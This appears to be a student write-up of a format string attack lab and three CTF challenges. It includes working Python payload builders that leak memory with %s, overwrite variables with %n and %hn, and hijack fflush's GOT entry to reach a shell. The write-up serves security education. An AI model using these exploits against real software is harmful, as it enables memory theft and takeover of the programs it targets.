# Format String Attack Lab

## Task 1: Crashing the Program

Crashing the program will be a very simple task. Since we have control over the
format string parameter of printf, we can pass to it "%s", which tries to read
from the address on top of the stack, and since it is very likely that this
address is not a valid one, the program will seg fault.

```sh
$ nc 10.9.0.5 9090
%s
^C
```

Server output:

```text
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffab1800
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068

server-10.9.0.5 | The target variable's value (before): 0x11223344
```

There is no Returned Properly message, so we conclude that we successfully
crashed the program.

## Task 2: Printing Out the Server Programâ€™s Memory

### Task 2.A: Stack Data

By consulting the manual pages for printf, we see that the "%x" format
specifier prints in hexadecimal the value at the top of the stack. We also know
that our format string itself is stored on the stack, so if we "dig up" the
stack enough with "%x", we will eventually find our string. We will use python
to generate the string for us.

```sh
$ python3 -c "print('AAAA' + '%x.'*100)" | nc 10.9.0.5 9090
^C
```

Server output:

```text

server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

If we count it up, we see that our "41414141" appears after 64 "%x". We can
also access it directly with "%64\$x

### Task 2.B: Heap Data

This task will be very similar to the last one, but instead if placing 'AAAA'
at the start of our payload, we will place the address we want to read (which
by looking at the server logs we determine it to be 0x080b4008) and replace the
last "%x" with a "%s", which reads a string from the address until a null byte
is found.

```python
$ cat build_string.py
#!/usr/bin/python3
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x"*63 + "%s"
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

```sh
$ ./build_string.py && cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 |@
                1122334410008049db580e532080e61c0fff21230fff2115880e62d480e5000fff211f88049f7efff212300648049f4780e53205dc5dcfff21230fff212309af4720000000000000000000000000080f99f0080e500080e5000fff218188049efffff212305dc5dc80e5320000fff218e40005dcA secret message
```

As we can see, the string stored at this address is "A secret message".

### Task 3.A: Change the value to a different value

In this task, we are asked to write anything to an arbitrary address. To do
this, in similarity to previous tasks, we put the address we want to write to
at the start of the payload, followed by, in this case, 63 "%x" and lastly,
instead of "%s" like we used in the last task, we use "%n", which according to
the manual writes the number of bytes printed so far to the address at the top
of the stack. Our script will look like this:

```python
$ cat build_string.py
#!/usr/bin/python3
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x"*63 + "%n"
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

```sh
$ ./build_string.py && cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | The target variable's value (after): 0x000000ec
```

We have successfully written to target the number 0xec, which corresponds to
the number in hexadecimal of the bytes printed out by the printf function.

### Task 3.B: Change the value to 0x5000

This task is very similar to the last one, but instead of printing out 0xec
bytes before our "%n", we have to write 0x5000 bytes. printf offers a very
convenient way of doing this in the form of padding: we can add padding to our
last "%x" to inflate the number of bytes written. This padding will be equal to
0x5000 - 0xec.

```python
$ cat build_string.py
#!/usr/bin/python3
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x"*62 + "%" + str(0x5000 - 0xec) + "x" + "%n"
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content
```

```sh
$ ./build_string.py && cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 | The target variable's value (after): 0x00004ffd
```

Hmm wierd, we are 3 bytes off. No problem, we'll just change our padding to add
3 more bytes.

```python
s = "%x"*62 + "%" + str(0x5000 - 0xec + 0x3) + "x" + "%n"
```

```sh
$ ./build_string.py && cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 | The target variable's value (after): 0x00005000
```

## CTF 1

We start by verifying what kind of protects the given program has:

```sh
$ checksec program
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

Since there is a canary and the stack is not executable, a buffer overflow like
we did in previous labs is a lot harder. We should look for other
vulnerabilities. We found the following line of code:

```c
printf(buffer);
```

We see that *buffer*, which is input controlled by the user, is in the format
string parameter of printf, therefore we can do some damage here. Also, since
the flag is in a global variable, it will be trivial to exploit this, just need
to put the address of where this flag is stored at the top of the stack and
then use "%s" in the format string payload to read it.

```sh
$ objdump -t program | grep flag
0804c060 g     O .bss    00000028    flag
```

Not that we have the address to read, just need to write the script.

```py
N = 32
content = bytearray(0x0 for i in range(N))

flag = 0x0804c060 
content[0:4] = (flag).to_bytes(4,byteorder='little')

s = "%s"
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('payload', 'wb') as f:
  f.write(content)
```

And let's test it:

```sh
$ cat payload | nc ctf-fsi.fe.up.pt 4004
Try to unlock the flag.
Show me what you got:You gave me this: `flag{...}

Disqualified!
```

And we get the flag!

## CTF 2

We start by verifying what kind of protects the given program has:

```sh
$ checksec program
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

We get similar results to the last CTF, so we will look for format string
vulnerabilities again.

```c
printf(buffer);
```

Once again, we find this vulnerable line of code. Although this time,
exploiting won't be as straight forward as the last time. There seems to be
a variable *key* which we need to overwrite to equal to 0xbeef. Seems simple
enough. Let's first find out the address of *key*:

```sh
$ objdump -t program | grep key
0804c034 g     O .bss    00000004    key
```

Now, instead of reading from this address like we did in the previous CTF, we
need to write to it. For this we will perform a short write using "%hn", making
sure to print 0xbeef bytes before it.

```py
#!/usr/bin/python3

N = 32
content = bytearray(0x0 for i in range(N))

key = 0x0804c034
content[0:4] = "JUNK".encode('latin-1')
content[4:8] = (key).to_bytes(4,byteorder='little')

s = "%48871u%hn"
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

with open('payload', 'wb') as f:
    f.write(content)
```

We prepend "JUNK" to our payload so that our address does not get stolen by the
"%u", which is used just for padding. Let's try it:

```sh
$ (cat payload;cat) | nc ctf-fsi.fe.up.pt 4005
(...)
Backdoor activated
cat flag.txt
flag{...}
```

And we got it!

## Extra CTF - FinalFormat

From the name of the challenge we already suspect we are facing a format string
vulnerability. But first let's check the security of the binary we are given to
get an ideia of how we might exploit it.

```sh
$ checksec program
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

We can see the the stack is not executable and also there is a canary, so
a typical stack based buffer overflow like we did in previous labs is a lot
harder to pull off. But on the other hand, there is no address randomization and
also RELRO is only partial. Now, let's check if the program really is
vulnerable to a format string vulnerability as we suspect.

```sh
$ ./program
There is nothing to see here...%s
Segmentation fault
```

When we pass a "%s" to the program, we get a segmentation fault. This is
because on a format string, "%s" tries to read from the address on the top of
the stack until a null byte is found, but since this address is probably not
valid, this read fails. So, our suspicion is confirmed: we have a format string
vulnerability, now let's exploit it! Let's start by disassembling main in gdb.

```sh
$ gdb program
gdb-peda$ disass main

End of assembler dump.
```

So, after analizing the disassemble and the normal flow of execution, we
conclude that the program is very simple: it prints the string "There is
nothing to see here...", then calls scanf and gets up to 60 characters from
stdin, after that prints the string "You gave me this:" followed by another
printf that probably looks like this printf(buffer), where buffer is user
controlled input. So, besides this format string vulnerability, there doesn't
seem to be anything wrong with this program. We will now use objdump to try to
find any hidden variables or functions.

```sh
$ objdump -t program
(...)
08049236 g     F .text  00000037              old_backdoor
(...)
```

And sure enough, we find this wierd old_backdoor function (we know it is
a function since it is in the .text section). Let's see what is does.

```sh
$ objdump -D program
(...)
08049236 <old_backdoor>:
    8049236: f3 0f 1e fb           endbr32

    804923d: 53                    push   %ebx
    804923e: e8 2d ff ff ff        call   8049170 <__x86.get_pc_thunk.bx>

    804926c: c3                    ret
(...)
```

This functions makes a call to system(), and judging by its name, we're
guessing it will probably spawn a shell. There are two steps to exploiting
a program with a format string vulnerability: find what to write and where to
write it. It's looks like we already found our what, let's note in down.

```python
$ cat exploit.py
#!/usr/bin/python3

# old_backdoor: 0x08049236

content = bytearray(0x0 for i in range(60))
```

This is how our exploit script is looking so far. Now for what to write: we see
that after the vulnerable printf call in main, there is a call to fflush. Since
this is a library call, the code will lookup a table where it can get the
address where it's code is. Since RELRO is only partial, this table is
overwritable. If we replace the address for the real fflush with the address
for old_backdoor, we control the flow of the program! Now lets find the fflush
address.

```sh
$ objdump -R program | grep fflush
0804c010 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

Now we know what to write and where to write, so we're ready to start building
our payload! But first let's try to get the printf stack pointer to point to
our input.

```sh
$ ./program 
There is nothing to see here...AAAA%x
You gave me this:AAAA41414141
```

We see that, after just one %x, we are already getting our output printed back
to us, now if we replace %x with %n, and supply a valid address, we can write
to it.

```python
$ cat exploit.py
#!/usr/bin/python3

# old_backdoor: 0x08049236

content = bytearray(0x0 for i in range(60))
fflush_addr = 0x0804c010
content[0:4] = (fflush_addr).to_bytes(4,byteorder='little')

s = "%x"
fmt = (s).encode('latin1')
content[4:4+len(fmt)] = fmt

with open('payload', 'wb') as f:
  f.write(content)
```

```sh
$ ./exploit.py && cat payload | ./program 
There is nothing to see here...You gave me this:804c010
```

As we can see, we manage to print back to us with "%x" the address with want to
write to. Now, for writing, we will perform 2 short writes: in the first we
write the less significant half of old_backdoor, and then the other half.

```python
$ cat ./exploit.py
#!/usr/bin/python3

# old_backdoor: 0x08049236

content = bytearray(0x0 for i in range(60))
fflush_addr = 0x0804c010
content[0:4] = "JUNK".encode('latin-1')
content[4:8] = (fflush_addr).to_bytes(4,byteorder='little')
content[8:12] = "JUNK".encode('latin-1')
content[12:16] = (fflush_addr + 2).to_bytes(4,byteorder='little')

first_write = 0x9236 - 16
second_write = 0x10804 - 0x9236
s = "%" + str(first_write) + "u%hn%" + str(second_write) + "u%hn"
fmt = (s).encode('latin1')
content[16:16+len(fmt)] = fmt

with open('payload', 'wb') as f:
  f.write(content)
```

There are just a few things that need further explaining: first, we are padding
our flush address with "JUNK", this is because the "%u"s we use "steal" the
element on the top of the stack, so we add this so that it does not steal our
address, since we want it to be used by "%hn". Also, you may notice that we
used 0x10804 as the second half of the old_backdoor address. This is a trick we
use since 0x804 is less than 0x9236, so it would have given a negative value,
which we don't want. Now let's run it!

```sh
$ ./exploit.py && cat payload | ./program
(...)
Backdoor activated
```

And we get the "Backdoor activated" message, we have successfully taken control!
Just need one last trick: although we called the old_backdoor function, we
didn't get a shell. To fix this, just need to pipe another cat:

```sh
$ ./exploit.py && (cat payload;cat) | ./program
(...)
Backdoor activated
whoami
seed
```

Success! Now just pipe it to the server instead of our local program and we get
the flag.

```sh
$ ./exploit.py && (cat payload;cat) | nc ctf-fsi.fe.up.pt 4007
(...)
cat flag.txt
flag{ **REDACTED** }
```
